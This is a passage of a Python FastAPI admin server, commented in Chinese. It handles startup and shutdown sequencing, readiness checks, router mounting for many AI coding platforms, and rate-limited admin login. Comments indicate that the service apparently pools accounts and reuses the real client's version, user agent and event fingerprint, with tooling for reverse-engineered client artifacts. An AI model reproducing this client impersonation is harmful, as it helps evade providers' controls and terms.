    只做「没有它就不能接单」的那几件事：运行配置覆盖、客户端路径覆盖、历史会话
    清理、定时调度器、登录后自动任务。可选预热（客户端版本发现、平台路径预热、
    更新检查）一律不在这里 —— 它们不挡就绪。
    """
    done = []
    try:
        from admin.runtime_settings import apply_overrides
        with SessionLocal() as db:
            applied = apply_overrides(db)
        if applied:
            logger.info("运行配置已套用 %d 项覆盖", applied)
        done.append("runtime_settings")
    except Exception as exc:  # noqa: BLE001 - 库表异常不影响启动
        logger.warning("运行配置套用失败：%s", exc)
    try:
        from admin import wb_paths
        overrides = wb_paths.load_into_wb()
        if any(overrides.values()):
            logger.info("已应用后台路径设置：%s", overrides)
        done.append("wb_paths")
    except Exception:  # noqa: BLE001
        logger.exception("应用后台路径设置失败（继续用自动扫描）")
    try:
        with SessionLocal() as db:
            session_store.purge(db)
        done.append("session_purge")
    except Exception:  # noqa: BLE001
        logger.exception("清理历史会话失败（不影响启动）")
    try:
        from admin.scheduler import start_scheduler
        start_scheduler()
        done.append("scheduler")
    except Exception:  # noqa: BLE001
        logger.exception("定时调度器启动失败（不影响服务启动）")
    try:
        from admin.post_login import resume
        resume()
        done.append("post_login")
    except Exception:  # noqa: BLE001
        logger.exception("恢复登录后自动任务失败（不影响服务启动）")
    return {"steps": done}


def _log_client_version() -> None:
    """客户端版本发现：只影响日志与出站 UA 的准确度，**不挡就绪**。

    它要扫盘、读 `resources/app.asar`，最坏情况还要读 22MB 的
    `cli/dist/codebuddy.js`（见 wb_install 的来源顺序）。原来直接在 startup 里
    同步跑，慢盘上等于让「就绪」等一次全盘扫描 —— 所以挪到线程里。

    顺序仍然保持「先应用后台路径覆盖、再做版本发现」：否则拿到的还是自动扫描
    结果，后台改过的安装目录要等下一次发现才生效（见 wb_install._ov 的优先级）。
    """
    try:
        from admin import wb_paths
        overrides = wb_paths.load_into_wb()
        if any(overrides.values()):
            logger.info("已应用后台路径设置：%s", overrides)
    except Exception:  # noqa: BLE001 - 数据库不可用时继续用自动扫描
        logger.debug("后台路径设置暂时套用不上（继续用自动扫描）", exc_info=True)
    try:
        from wb_install import WB
        logger.info("客户端版本：%s", WB.describe())
        if not WB.is_version_dynamic():
            logger.warning(
                "未找到本机 WorkBuddy 安装目录，客户端版本退化为兜底值；"
                "如需与真实客户端一致，请设置 WORKBUDDY_INSTALL_DIR "
                "或把安装盘符加进 WORKBUDDY_DRIVES"
            )
        if getattr(settings, "DEV_TOOLS", True):
            logger.info("逆向产物目录：%s（开发工具已开启，可在后台一键拆包）",
                        WB.source_dir())
    except Exception:  # noqa: BLE001
        logger.exception("客户端版本发现失败（不影响启动）")


# ---------------------------------------------------------------------------
# 关闭顺序（任务 2 交付）：清理只由这一处承担
# ---------------------------------------------------------------------------


def _shutdown_drain_timeout() -> float:
    """关闭时等待在途工作归零的兜底上限（秒），0 表示不限时。

    正常路径的「等多久」由用户和进程所有者（控制通道 / 运行器）决定，这里只是
    「有人直接给进程发信号」时的有序收尾；超时只记日志，不谎报已排空。
    """
    return _env_float("ADMIN_SHUTDOWN_DRAIN_TIMEOUT", 60.0)


@app.on_event("shutdown")
async def graceful_shutdown():
    """关闭顺序的**唯一**承担者：封口 → 等在途归零 → 停止/刷新 → 进程退出。

    为什么必须集中成一处：原来 IP 活动 flush、上游连接池、loop watch 各挂一个
    shutdown 钩子，顺序取决于装饰器位置，而且**没有任何一处**等「请求结束后仍在
    继续的工作」（审计落库、后台 Job、刚派发出去的定时任务）。现在的顺序是：

    1. 封口（关准入）：和 `begin()` 用同一把锁，draining 及以后的阶段不重复操作；
    2. 等 active_requests / active_jobs 归零 —— 请求、子任务、审计都在里面；
    3. 标记 stopping（对外不再有强制入口，界面进入「正在关闭服务」）；
    4. 按固定顺序跑原有清理：IP 活动 flush → 上游连接池 → loop watch；
       阻塞的那些（`ip_activity.flush`）一律丢进线程，不在事件循环里等磁盘；
    5. 标记 stopped，交给 Uvicorn 完成进程退出。
    """
    import asyncio
    import secrets

    from admin.lifecycle import PHASE_READY, PHASE_STARTING

    lifecycle = get_lifecycle()
    order = []

    probe = _DEGRADED_PROBE
    if probe is not None:
        probe.stop()

    if lifecycle.snapshot()["phase"] in (PHASE_STARTING, PHASE_READY):
        try:
            lifecycle.begin("shutdown", "shutdown-" + secrets.token_hex(6))
        except Exception:  # noqa: BLE001 - 封口失败也要继续按顺序收尾
            logger.exception("关闭时封口失败（继续收尾）")
    order.append("sealed")

    timeout = _shutdown_drain_timeout()
    timed_out = False
    pending = lifecycle.snapshot()
    if pending["active_requests"] or pending["active_jobs"]:
        logger.info(
            "关闭：仍有 %d 个请求、%d 个后台任务在跑，等它们结束（上限 %.0fs）",
            pending["active_requests"], pending["active_jobs"], timeout)
    try:
        if timeout > 0:
            await asyncio.wait_for(lifecycle.wait_empty(), timeout)
        else:
            await lifecycle.wait_empty()
    except (asyncio.TimeoutError, TimeoutError):
        timed_out = True
        logger.warning("关闭时等待在途工作超时（%.0fs），继续收尾：%s",
                       timeout, lifecycle.snapshot())
    order.append("drained")

    lifecycle.mark_stopping()

    await _flush_ip_activity()
    order.append("ip_activity")
    await _stop_upstream_connections()
    order.append("upstream_pool")
    await _stop_loop_watch()
    order.append("loop_watch")

    lifecycle.mark_stopped()
    order.append("stopped")
    logger.info("关闭顺序完成：%s", " → ".join(order))
    return {"order": order, "timed_out": timed_out}


async def _flush_ip_activity():
    """把 IP 活动缓冲刷进库（阻塞 I/O，丢线程）。只有 `graceful_shutdown` 调它。"""
    import asyncio
    from admin import ip_activity
    task = getattr(ip_activity, "_task", None)
    if task is not None and not task.done():
        task.cancel()
        await asyncio.gather(task, return_exceptions=True)
    await asyncio.to_thread(ip_activity.flush)


@app.on_event("startup")
async def _start_upstream_connections():
    # 让「默认 HTTPS 上下文」复用共享信任库，并在后台线程里预建它。
    #
    # 不做的话：`http.client` 的每条新连接都会 `create_default_context()`，
    # 在 Windows 上等于**重扫一遍系统证书库**（实测单次 3~13 秒），
    # 而平台客户端（marvis / qoder / trae …）用的是同步 `urllib`，
    # 这一步就发生在一单 worker 的事件循环线程上 —— 2026-11-16 的
    # 「全站无响应」现场：栈停在 `ssl._load_windows_store_certs` 与 `ssl.read`。
    try:
        from admin import upstream_http
        upstream_http.install_ssl_defaults()
        upstream_http.warm_ssl_context()
    except Exception:  # noqa: BLE001 - 预热失败不影响启动（只是首连慢）
        logger.exception("SSL 上下文准备失败（不影响启动）")
    # Own the embedded runtime's pool; recreate it after a service restart.
    if os.getenv("WORKBUDDY_ANDROID") == "1":
        from admin import upstream_http
        await upstream_http.start(app, proxy.HTTP_LIMITS)
    # 「设置 → 运行配置」的覆盖值不在这里套用：这个 startup 钩子注册在
    # `_startup` 之前，此刻 init_db 还没跑，首次启动（尤其是全新安装的 APK）
    # 必然撞上 `no such table: system_settings`，覆盖值要等到下次重启才生效。
    # 套用动作已挪到 `_startup` 里 init_db 之后，见 `_apply_runtime_overrides`。


@app.on_event("startup")
async def _tune_blocking_executor():
    """放大默认线程池 —— 平台网关的同步上游调用全靠它。

    `asyncio.to_thread` / `loop.run_in_executor(None, …)` 走默认执行器，默认
    `max_workers = min(32, cpu+4)`（4 核机器只有 8）。而**流式转发会长期占用
    线程**：每块数据都要在 worker 里阻塞 `resp.read()` 等上游吐字，SSE 可以等
    几百秒。8 条并发流就能把默认池占满，此后鉴权 / 选号 / 记账 / IP 落库全部
    排队 —— 事件循环是活的，但什么也推进不了，从外面看仍是「服务卡住」。

    放大到 64（可用 `ADMIN_BLOCKING_THREADS` 覆盖）：正常并发规模下两边的活
    不会再互相饿死。
    """
    try:
        import asyncio
        from concurrent.futures import ThreadPoolExecutor

        raw = (os.getenv("ADMIN_BLOCKING_THREADS", "") or "").strip()
        try:
            workers = int(raw) if raw else 64
        except ValueError:
            workers = 64
        workers = max(16, min(256, workers))
        asyncio.get_running_loop().set_default_executor(
            ThreadPoolExecutor(max_workers=workers,
                               thread_name_prefix="wb-blocking"))
        logger.info("默认线程池 %d 线程（同步上游调用不再互相排队）", workers)
    except Exception:  # noqa: BLE001 - 调不动就不调，不能影响启动
        logger.exception("默认线程池调整失败（不影响启动）")


async def _stop_upstream_connections():
    """关闭上游连接池。只有 `graceful_shutdown` 调它（清理只由一处承担）。"""
    from admin import upstream_http
    await upstream_http.stop(app)
    # perf 线的共享 httpx 连接池（admin/http_shared.py）也在这里一并关闭。
    try:
        from admin import http_shared
        http_shared.reset_shared()
    except Exception:  # noqa: BLE001 - 关闭阶段只记日志
        logger.exception("关闭共享上游连接池失败")
    # 第 4 轮：Trae / CodeArts / Qoder 的 urllib 长连接池（admin/http_keepalive.py）。
    try:
        from admin import http_keepalive
        http_keepalive.purge_all("shutdown")
    except Exception:  # noqa: BLE001
        logger.exception("清空 urllib 长连接池失败")


@app.on_event("startup")
async def _start_loop_watch():
    # **必须是 async 启动钩子**：探针要记下「事件循环线程」的 ident，
    # 同步钩子会被 Starlette 丢到线程池执行，记到的就是工作线程。
    try:
        from admin import loop_watch
        # `start()` 是**同步**函数（内部用 get_running_loop().create_task
        # 挂心跳协程），这里不能 await —— 它返回的是 bool。
        loop_watch.start(app)
    except Exception:  # noqa: BLE001 - 探针起不来不影响业务
        logger.exception("事件循环探针启动失败（不影响服务）")


async def _stop_loop_watch():
    """停事件循环探针。只有 `graceful_shutdown` 调它（清理只由一处承担）。"""
    try:
        from admin import loop_watch
        await loop_watch.stop()
    except Exception:  # noqa: BLE001
        pass

if os.getenv("WORKBUDDY_ANDROID") == "1":
    accounts.router.routes[:] = [route for route in accounts.router.routes
                                if getattr(route, "path", "") not in
                                ("/api/accounts/scan-local", "/api/accounts/import-local", "/api/accounts/{acc_id}/inject")]
app.include_router(accounts.router)
app.include_router(keys.router)
app.include_router(models.router)
app.include_router(proxy.router)
app.include_router(proxies.router)
app.include_router(audio.router)
app.include_router(images.router)
app.include_router(videos.router)
# 内置智能体（/api/agent，后台登录态）与 MCP 工具服务（/mcp，API Key 鉴权）。
# 两者共用 admin/media_service.py 的生成与合并逻辑，只是出口协议不同。
app.include_router(agent_router.router)
app.include_router(mcp_router.router)
app.include_router(sync.router)
app.include_router(schedules.router)
app.include_router(logs.router)
app.include_router(groups.router)
app.include_router(stats.router)
# 给 API Key 用的模型广场（/v1/model-market）：只返回该 Key 能用的模型
app.include_router(model_market_key_router.router)
app.include_router(credits.router)
# 登录设备管理（多设备在线 + 踢下线 + 拉黑）
app.include_router(sessions_router.router)
app.include_router(maintenance.router)
from admin.routers import runtime_config
app.include_router(runtime_config.router)
app.include_router(growth.router)
app.include_router(growth_center.router)
app.include_router(ip_management.router)
from admin.routers import client_profile
app.include_router(client_profile.router)
# 客户端路径：自动发现之外的手动指定（换盘 / 便携版 / userData 迁移）。
from admin.routers import client_paths
app.include_router(client_paths.router)
# 浏览器端自检上报：控制台把 pageerror / 资源状态 / 注入痕迹 POST 回来，
# 落 logs/client-diag.jsonl。用于定位「页面结构完全正常、使用者那边却报
# SyntaxError 且按钮失灵」这类只在其本机环境复现的问题。
from admin.routers import client_diag
app.include_router(client_diag.router)
# 多平台：平台元信息（控制台切换模块的唯一数据源）+ Trae 专属管理接口。
from admin.platform.router import router as platforms_router
app.include_router(platforms_router)
# 风控哨兵：信号汇总 / 明细 / 止损开关。
from admin.platform.sentinel_router import router as sentinel_router
app.include_router(sentinel_router)
# 首页总览：一次返回积分/用量/额度/缓存/账号监测的聚合。
from admin.platform.overview_router import router as overview_router
app.include_router(overview_router)
# 预警管理：邮件 / 飞书 / QQ 机器人 的通知配置与测试发送。
from admin.platform.alerts_router import router as alerts_router
from admin.platform.alerts_router import bootstrap as alerts_bootstrap
app.include_router(alerts_router)
alerts_bootstrap()
# 平台网关调度：策略 / 优先级 / 健康度 / 禁用开关。
from admin.platform.gateway_api import router as gateway_api_router
app.include_router(gateway_api_router)
# Trae 授权回调：**必须挂在根路径 /authorize**
# —— 上游对 auth_callback_url 做路径白名单校验，自定义路径会 Login Failed。
# 这个路由不校验管理员身份（浏览器重定向没有 token），只做会话匹配。
from admin.platform.trae.routers.accounts import device_callback as trae_device_callback
app.add_api_route("/authorize", trae_device_callback, methods=["GET"],
                  include_in_schema=False)

# 平台跑分：按平台聚合速度/稳定性（平台管理底部卡片用）
from admin.platform.bench_router import router as bench_router
app.include_router(bench_router)
try:
    from admin.platform.trae.routers import accounts as trae_accounts_router
    app.include_router(trae_accounts_router.router)
except Exception:  # noqa: BLE001 - trae 目录被裁剪时降级为不挂载
    logger.exception("Trae 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.qoder.routers import accounts as qoder_accounts_router
    app.include_router(qoder_accounts_router.router)
except Exception:  # noqa: BLE001 - qoder 目录被裁剪时降级为不挂载
    logger.exception("Qoder 管理接口挂载失败（其它功能不受影响）")
try:
    # 设备授权（PKCE）：/api/qoder/device/{start,poll,claim}
    from admin.platform.qoder.routers import oauth as qoder_oauth_router
    app.include_router(qoder_oauth_router.router)
except Exception:  # noqa: BLE001
    logger.exception("Qoder 设备授权接口挂载失败（PAT 路径不受影响）")
try:
    from admin.platform.loomy.routers import accounts as loomy_accounts_router
    app.include_router(loomy_accounts_router.router)
except Exception:  # noqa: BLE001 - loomy 目录被裁剪时降级为不挂载
    logger.exception("Loomy 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.raccoon.routers import accounts as raccoon_accounts_router
    app.include_router(raccoon_accounts_router.router)
except Exception:  # noqa: BLE001 - raccoon 目录被裁剪时降级为不挂载
    logger.exception("小浣熊管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.codearts.routers import accounts as codearts_accounts_router
    app.include_router(codearts_accounts_router.router)
except Exception:  # noqa: BLE001 - codearts 目录被裁剪时降级为不挂载
    logger.exception("CodeArts 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.minimax.routers import accounts as minimax_accounts_router
    app.include_router(minimax_accounts_router.router)
except Exception:  # noqa: BLE001 - minimax 目录被裁剪时降级为不挂载
    logger.exception("MiniMax 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.wps_lingxi.routers import accounts as wps_lingxi_accounts_router
    app.include_router(wps_lingxi_accounts_router.router)
except Exception:  # noqa: BLE001 - wps_lingxi 目录被裁剪时降级为不挂载
    logger.exception("WPS 灵犀管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.marvis.routers import accounts as marvis_accounts_router
    app.include_router(marvis_accounts_router.router)
except Exception:  # noqa: BLE001 - marvis 目录被裁剪时降级为不挂载
    logger.exception("腾讯 Marvis 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.krowork.routers import accounts as krowork_accounts_router
    app.include_router(krowork_accounts_router.router)
except Exception:  # noqa: BLE001 - krowork 目录被裁剪时降级为不挂载
    logger.exception("KroWork 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.astudio.routers import accounts as astudio_accounts_router
    app.include_router(astudio_accounts_router.router)
except Exception:  # noqa: BLE001 - astudio 目录被裁剪时降级为不挂载
    logger.exception("AStudio 管理接口挂载失败（其它功能不受影响）")
try:
    from admin.platform.codar.routers import accounts as codar_accounts_router
    app.include_router(codar_accounts_router.router)
except Exception:  # noqa: BLE001 - codar 目录被裁剪时降级为不挂载
    logger.exception("科搭 Codar 管理接口挂载失败（其它功能不受影响）")
if os.getenv("WORKBUDDY_ANDROID") != "1" and not env_guard.IS_PROD:
    # 逆向产物管理（任意目录创建 + 递归读取）：**生产不挂载**。
    # 中间件还有一道 404，双保险 —— 见 env_guard.PROD_BLOCKED_PREFIXES。
    from admin.routers import app_source
    app.include_router(app_source.router)
app.include_router(login_router.router)
app.include_router(releases.router)
# 自助上传页（无需后台登录态）：复刻 WorkBuddy 手机号登录页，
# 让「发给朋友」这一诉求成立 —— 对方不需要知道后台口令。
app.include_router(join_invites_router)
# 多平台公开注册入口（/api/open/*）：与 /join 同一把总闸，默认关闭
app.include_router(public_auth_router)
# join 总闸：状态 / 开关 / 签发访问链接 + 公开的票据兑换端点。
from admin.routers import join_gate as join_gate_api
app.include_router(join_gate_api.router)


@app.on_event("startup")
def _startup():
    # 生命周期换代：**每次 lifespan 启动都重建 instance_id**，避免同一个进程里
    # 重建 app（测试、uvicorn 复用进程、--reload）继承上一次的 draining/stopping。
    # 这是**本 handler 的第一步**（不是整个 lifespan 的第一步）：真正最早执行的
    # startup 钩子是 _start_upstream_connections —— 它只安装/预热 SSL 默认上下文，
    # 不碰生命周期也不接业务。放在这里是因为换代必须早于本 handler 之后的任何
    # 初始化与任何请求；就绪要到本函数末尾、必要初始化完成之后才发布。
    try:
        lifecycle = get_lifecycle()
        lifecycle.reset()
    except Exception:  # noqa: BLE001 - 生命周期坏了也不能让服务起不来
        logger.exception("生命周期复位失败（服务继续，但就绪探针会保持未就绪）")

    # Marvis 出口池硬闸门（**只**在 MARVIS_EGRESS_REQUIRED=1 时才可能抛错）。
    #
    # 为什么不放在 marvis.install()：平台装配走 admin.platform.loader 的
    # 逐项 try/except（「单个平台装配失败不得影响主服务启动」），异常会被吞成
    # 一条 warning，进程照样起 —— 闸门等于没装。这里在 uvicorn 启动钩子里，
    # 抛出去就是进程退出，才是部署侧要的「没池就别起」。
    # 默认（未设 REQUIRED）仍是 WARNING，不拦启动。
    # 顺序：先换代再装闸门 —— 换代不能因为闸门抛错而漏掉。
    try:
        from admin.platform.marvis import check_egress
    except ImportError:  # marvis 目录被裁剪：本平台的事，不该拖累启动
        pass
    else:
        check_egress(strict=True)

    # 启动手机号登录会话的**定时回收**线程。
    #
    # 为什么必须定时回收：原来的 `_gc_locked()` 只在「新建会话」时被调用，
    # 于是流量停下后过期会话就一直留在表里，每个都攥着一个 httpx.Client
    # （连接池 + socket）—— 这是真实的资源泄漏，表现为「内存慢慢涨」。
    # 放在 try 里：回收线程起不来不该影响服务启动。
    try:
        from admin import wb_login
        wb_login.start_gc_thread()
    except Exception:
        logger.exception("手机号登录会话回收线程启动失败（不影响其它功能）")

    # 未配置登录凭据时给出醒目告警：此时后台登录一律 503，不会退化成空口令
    if not settings.ADMIN_USERNAME or not settings.ADMIN_PASSWORD:
        logger.warning(
            "未配置 ADMIN_USERNAME / ADMIN_PASSWORD，后台登录已禁用；"
            "请在 .env 中设置后重启（不再提供 admin/admin123 这类默认口令）"
        )
    else:
        if settings.ADMIN_USERNAME == "admin" and settings.ADMIN_PASSWORD == "admin123":
            logger.warning("仍在使用 admin/admin123 弱口令，且服务可能监听 0.0.0.0，请尽快更换")
        # 2026-11-24（安全 S4）：登录锁定默认关闭后，密码强度是主要防线。
        # 这里只能检查 .env 里的初始密码；后台改过密码时库里只有哈希，
        # 由首次登录成功时再查一次（_warn_weak_password_once）。
        try:
            _weak = password_weakness(settings.ADMIN_PASSWORD, settings.ADMIN_USERNAME)
        except Exception:  # noqa: BLE001
            _weak = []
        if _weak:
            logger.warning(
                "ADMIN_PASSWORD（.env 初始密码）偏弱：%s。若后台已改过密码则以库里的为准。"
                "监听地址 %s:%s", "、".join(_weak), settings.HOST, settings.PORT)
        if not getattr(settings, "LOGIN_RATE_LIMIT_ENABLED", False):
            logger.warning(
                "后台登录失败锁定已关闭（ADMIN_LOGIN_RATE_LIMIT=0）：只保留递增延迟、"
                "失败告警与 abuse_guard。公网部署请确认密码足够强，或在 nginx 上限制后台来源 IP。")

    # 环境画像：出问题时第一眼要能确认「这台到底是 prod 还是 dev」。
    logger.info(
        "运行环境 APP_ENV=%s prod=%s 会话单例=%s 设备绑定=%s CSRF=%s 文件系统运维=%s",
        env_guard.APP_ENV, env_guard.IS_PROD,
        settings.SESSION_SINGLE, settings.SESSION_BIND_DEVICE,
        settings.CSRF_ENABLED, env_guard.fs_ops_allowed(),
    )

    # 数据库不可用（例如 MySQL 被 OOM 杀掉正在重启）时**不能**让启动失败：
    # 这里抛异常会让 uvicorn 直接退出进程，nginx 侧变成 502，且需要人工重启。
    # 改为重试 + 降级启动，进程保持存活；但「就绪」必须等数据库与必要表都可用 ——
    # 降级期间对外说自己可以接单，只会让每个业务请求撞 500。
    db_ok = wait_database_ready()
    init_ok = False
    if db_ok:
        try:
            init_ok = init_db() is not False
        except Exception:
            logger.exception("建表/迁移失败，先不发布就绪（降级模式继续运行）")
        if init_ok:
            # api_keys.key_full 旧 base64 → secret_box 密文（幂等；2026-11-24 第 3 轮）。
            _migrate_key_full = getattr(keys, "migrate_key_full", None)
            try:
                _moved = 0
                if _migrate_key_full is not None:
                    with SessionLocal() as _kdb:
                        _moved = _migrate_key_full(_kdb)
                if _moved:
                    logger.warning("api_keys.key_full 已加密迁移 %d 条", _moved)
            except Exception:  # noqa: BLE001 - 迁移失败不挡启动，下次启动再试
                logger.exception("api_keys.key_full 加密迁移失败（读取仍兼容旧 base64）")
        if not init_ok:
            logger.error("建表/迁移未完成：服务先以降级模式运行，后台探测恢复后自动补")
    else:
        logger.error("数据库当前不可用，服务以降级模式启动：请求将返回 503，恢复后自动自愈")

    if db_ok and init_ok:
        tables_ok, tables_reason = _required_tables_present()
    else:
        tables_ok = False
        tables_reason = "数据库不可用" if not db_ok else "建表/迁移未完成"
    ready_ok = bool(db_ok and init_ok and tables_ok)

    # 首次启动先建表再回填；数据库暂不可用时仍保留后台重试。
    try:
        from admin import rollup
        rollup.start_backfill_thread()
    except Exception:
        logger.exception("用量汇总后台回填线程启动失败（统计会自动降级为原表）")

    # 「设置 → 运行配置」的覆盖值、后台路径设置、历史会话清理、定时调度器与
    # 登录后自动任务都归 `_init_after_database_ready()`：它们都要求数据库与必要表
    # 可用（首次启动时表还不存在，早跑只会打一条 no such table 的告警然后静默失效）。
    # 降级启动时由后台探测恢复后补跑一次，见本函数末尾。

    # 装配流量治理运行态：在途租约上限、会话粘性路由（含后台 GC 线程）。
    # 这些是纯进程内存状态，**不需要数据库**，所以放在 db_ok 判定之外 ——
    # 数据库降级期间号池选号仍要能在内存里正常工作。
    try:
        from admin.pool import POOL
        POOL.configure(
            max_in_flight=settings.MAX_IN_FLIGHT,
            sticky_enabled=settings.STICKY_ENABLED,
            sticky_ttl_s=settings.STICKY_TTL_SECONDS,
            sticky_gc_s=settings.STICKY_GC_SECONDS,
        )
        logger.info(
            "号池运行态已装配：单号在途上限=%s 会话粘性=%s(ttl=%ss) 轮转上限=%s",
            settings.MAX_IN_FLIGHT or "不限", "开" if settings.STICKY_ENABLED else "关",
            settings.STICKY_TTL_SECONDS, settings.MAX_ROTATE,
        )
    except Exception:
        logger.exception("号池运行态装配失败，将退化为无粘性/无在途限制")

    # 后台预加载各平台的路径覆盖值（库查询约 0.3s，不能压在展示接口上）。
    try:
        from admin.platform import install_paths

        install_paths.warmup()
    except Exception:
        logger.debug("客户端路径覆盖预热失败", exc_info=True)

    # 客户端版本发现（出站 UA 与桌面事件指纹靠它）只影响日志与准确的 UA，
    # 但代价可能是扫盘 + 读 22MB 的 codebuddy.js。**不挡就绪**：丢到后台线程。
    # 显示「兜底」就说明没找到本机安装包，属于需要关注的状态，日志里仍然可见。
    threading.Thread(target=_log_client_version, name="wb-client-version",
                     daemon=True).start()

    # 必要初始化（运行配置 / 路径覆盖 / 会话清理 / 调度器 / 登录后任务）只在
    # 「数据库可用 + 建表完成 + 必要表齐」时执行；降级启动由后台探测补跑。
    if ready_ok:
        try:
            init_result = _init_after_database_ready()
            logger.info("必要初始化完成：%s", "、".join(init_result["steps"]))
        except Exception:  # noqa: BLE001 - 各步骤自己已经兜底，这里只是最后一道
            logger.exception("必要初始化失败，暂不发布就绪")

    # 就绪发布（**本函数最后一步**）：只有必要初始化完成且数据库/必要表可用才开。
    _publish_readiness(db_ok=db_ok, init_ok=init_ok, tables_ok=tables_ok,
                       reason=tables_reason)
    if not ready_ok:
        # 降级启动：后台用有超时 / 单飞 / 限频的**真实** DB 探测重查，恢复后补一次
        # 所需初始化再发布就绪。排空期间迟到的探测会被 ReadinessProbe 拒掉
        # （阶段不是 starting 就不补初始化、不发布），所以它无权把准入改回 ready。
        try:
            start_degraded_readiness_probe(
                on_recovered=_init_after_database_ready,
                timeout=_env_float("ADMIN_READINESS_PROBE_TIMEOUT",
                                   READINESS_PROBE_TIMEOUT),
                min_interval=_env_float("ADMIN_READINESS_PROBE_INTERVAL",
                                        READINESS_PROBE_INTERVAL),
            )
        except Exception:  # noqa: BLE001 - 探针起不来只是不会自动恢复
            logger.exception("后台数据库就绪探测启动失败（进程继续降级运行）")


def _get_stored_hash() -> str:
    """读取生效的密码哈希。

    `ADMIN_PASSWORD` 只负责首次初始化；一旦后台保存过新密码，数据库里的
    `admin_password` 覆盖值优先。这样 exe/apk 和带 .env 的部署都能直接在
    后台改密码，不会在下一次校验时又被环境变量改回去。

    返回空串表示「未配置登录凭据」——此时 login 一律拒绝，绝不允许空口令登录。
    """
    # 未配置密码：直接拒绝，且不往库里写任何东西
    if not settings.ADMIN_PASSWORD:
        return ""

    db = None
    try:
        db = SessionLocal()
        row = db.query(SystemSetting).filter(SystemSetting.key == "admin_password").first()

        # 后台修改是持久化覆盖值，优先于 .env。环境变量仅在首次没有覆盖时播种。
        if row and row.value:
            val = row.value
            if not val.startswith("pbkdf2$"):
                val = hash_password(val)  # 兼容旧版明文配置，读取时迁移
                row.value = val
                db.commit()
            return val
    finally:
        if db is not None:
            db.close()
    # 无记录：用配置密码并持久化哈希
    h = hash_password(settings.ADMIN_PASSWORD)
    db = None
    try:
        db = SessionLocal()
        db.add(SystemSetting(key="admin_password", value=h))
        db.commit()
    except Exception:
        pass
    finally:
        if db is not None:
            db.close()
    return h


def _login_fingerprint(request) -> str | None:
    """汇总客户端上报的设备/浏览器指纹，作为登录限流的第三维度。

    指纹由客户端自报、可伪造，所以**只收紧不放松**：带着同一组指纹的
    爆破（哪怕换了 IP）会被这本账拦住；不报指纹则该维度直接不参与，
    不影响其余两个维度的判定。格式不合法的头一律忽略。
    """
    from admin.client_identity import request_identities
    parts = [value for _kind, _digest, value in request_identities(request)]
    return hashlib.sha256("\n".join(sorted(parts)).encode("utf-8", "replace")).hexdigest()[:24] if parts else None


#: 进程内只对弱密码告警一次（登录成功时才拿得到明文，见 _warn_weak_password_once）。
_weak_password_warned = False


def _warn_weak_password_once(password: str) -> None:
    """首次登录成功时检查一次生效密码的强度（库里只有哈希，启动时查不了）。"""
    global _weak_password_warned
    if _weak_password_warned:
        return
    _weak_password_warned = True
    try:
        reasons = password_weakness(password, settings.ADMIN_USERNAME or "")
    except Exception:  # noqa: BLE001
        return
    if reasons:
        logger.warning(
            "后台管理员密码偏弱（%s）；登录失败锁定%s。建议在「设置 → 修改密码」"
            "换成 12 位以上、至少三类字符的强密码。", "、".join(reasons),
            "已开启" if getattr(settings, "LOGIN_RATE_LIMIT_ENABLED", False) else "已关闭")


@app.post("/api/login")
async def login(
    username: str = Form(...),
    password: str = Form(...),
    request: Request = None,
):
    """登录入口（异步外壳）。

    2026-11-24（安全 S4）：先在事件循环里完成「不锁人的递增延迟」
    （`asyncio.sleep`，**不占线程池**），再把真正的校验（PBKDF2 + 查库，都是
    阻塞操作）放进线程池。排队过长（同一 IP 并发爆破）直接 429，不校验密码。
    """
    # 权威 IP：仅当直连对端在 ADMIN_TRUSTED_PROXY_IPS 内时才采信反代头的
    # X-Real-IP / X-Forwarded-For（nginx 侧须 proxy_set_header X-Real-IP
    # $remote_addr 覆写）。否则所有请求看起来都是反代 IP，登录锁会退化成
    # 「全局锁」，任何人打几次错误密码就能把真管理员锁在门外。
    ip = client_ip_from_request(request)
    wait, busy = reserve_login_delay(ip, username)
    if busy:
        retry = max(1, int(wait) + 1)
        logger.warning("后台登录尝试排队过长，直接拒绝 ip=%s username=%s wait=%ds",
                       ip, username[:40], retry)
        raise HTTPException(
            status_code=429,
            detail=f"登录尝试过于频繁，请 {retry} 秒后再试",
            headers={"Retry-After": str(retry)},
        )
    if wait > 0:
        await asyncio.sleep(wait)
    return await run_in_threadpool(_login_sync, username, password, request, ip)


def _login_sync(username: str, password: str, request: Request, ip: str):
    fingerprint = _login_fingerprint(request) if request else None
    # 登录失败锁定默认关闭（ADMIN_LOGIN_RATE_LIMIT=1 才启用，见 config.py）。
    # 关闭时仍有：上面的递增延迟、失败告警、abuse_guard 的鉴权失败封禁。
    rate_limited = bool(getattr(settings, "LOGIN_RATE_LIMIT_ENABLED", False))
    if rate_limited:
        locked, wait = is_locked(ip, username, fingerprint)
        if locked:
            raise HTTPException(
                status_code=429,
                detail=f"登录尝试过于频繁，请 {wait} 秒后再试",
                headers={"Retry-After": str(wait)},
            )
    # 未配置凭据时直接拒绝（不能退化成「空口令可登录」）
    if not settings.ADMIN_USERNAME or not settings.ADMIN_PASSWORD:
        raise HTTPException(
            status_code=503,
            detail="后台未配置登录凭据，请在 .env 中设置 ADMIN_USERNAME 与 ADMIN_PASSWORD 后重启",
        )
    if username != settings.ADMIN_USERNAME or not verify_password(password, _get_stored_hash()):
        # 三个维度各自计数：成对键锁「这个 IP × 这个用户名」，
        # IP 全局键兜住换用户名撒网，指纹键兜住换 IP 共用指纹。
        if rate_limited:
            record_failure(ip, username, fingerprint)
        # 递增延迟 + 全站失败告警（不锁人，限流开关关闭时同样生效）。
        recent = note_login_failure(ip, username)
        logger.warning("后台登录失败 ip=%s username=%s fp=%s recent=%d",
                       ip, username[:40], fingerprint or "-", recent)
        raise HTTPException(status_code=401, detail="用户名或密码错误")
    # 密码正确：清空成对与 IP 全局计数（指纹维度也一并清，避免误伤后续正常登录）。
    clear_failures(ip, username, fingerprint)
    clear_login_delay(ip, username)
    logger.info("后台登录成功 ip=%s fp=%s", ip, fingerprint or "-")
    _warn_weak_password_once(password)

    # ---- 建会话 + 下发 HttpOnly Cookie（响应体里**不再返回 token**）----
    #
    # 为什么不返回：只要 token 出现在 JSON 里，前端就有机会把它塞进
